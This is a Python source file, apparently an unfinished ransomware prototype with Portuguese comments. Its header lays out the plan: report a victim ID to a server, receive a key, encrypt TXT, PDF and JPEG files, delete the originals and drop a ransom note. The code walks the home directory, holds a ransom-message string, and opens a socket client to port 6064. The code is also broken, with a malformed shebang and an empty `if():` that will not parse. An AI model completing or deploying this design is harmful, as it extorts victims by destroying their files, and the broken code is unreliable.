#!/bin/bash/env python
# coding=UTF-8
# by Tarcisio marinho
# github.com/tarcisio-marinho

#from AES.crypt import *
import os
import crypt

import socket, random


# listar diretorios a partir do /home/
# cada thread percorre um diretorio
# for caminho in ls:
# lista = append(caminho)

'''

    COMUNICA COM O SERVIDOR ENVIANDO O SEU ID
    O SERVIDOR ARMAZENA O ID E MANDA UMA CHAVE PARA CRIPTOGRAFAR
    MULTIPLAS THREADS- CADA UMA CRIPTOGRAFA UM TIPO DE ARQUIVO -> TXT PDF JPEG
    MULTIPLAS THREADS PARA EXCLUIR OS ARQUIVOS ORIGINAIS TXT PDF JPEG
    IF(TERMINOU(PDF)) -> RODA THREAD EXCLUIR(PDF)
    CRIAR ARQUIVO .TXT INFORMANDO QUE O CARA SI FUDEU

'''




texto='''

    Bom dia, você foi vitma do Ransomware.

'''

def menu():
    home=os.environ['HOME']
    print('Partindo de: '+str(home))
    # lista com todos os arquivos #
    diretorios=os.listdir(os.getcwd())
    tam=len(diretorios)
    # CRIAR UMA THREAD PARA CADA DIRETORIO
    # CADA THREAD LISTAR DIRETORIO
    retorno=listar(home)
    for arquivo in retorno:
        print(arquivo)

def listar(diretorio):
    # cria uma lista onde será adicionado o nome dos arquivos #
    arquivos=[]
    for caminho, diretorio, arquivo in os.walk(diretorio):
        for arq in arquivo:
            a=caminho+'/'+arq
            extensao=os.path.splitext(a)
            if():
                # a=a.replace(" ", "\ ").replace(" (", " \("). replace(")", "\)")
                # arquivos.append(a)
    return arquivos

def client(IP_serv):

    porta=6064
    try:
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_obj.connect((IP_serv, porta))
    except socket.error as erro:
        print('Erro ocorrido: '+str(erro))
        return
    # conectado ao servidor
    print('enviando ID')
    mensagem='TESTE_ID'
    socket_obj.send(mensagem)
    #data = socket_obj.recv(1024) # recebeu do servidor a chave publica


if __name__=="__main__":
    print('tentando conectar ao server .... ')
    #menu()
    client('127.0.0.1')
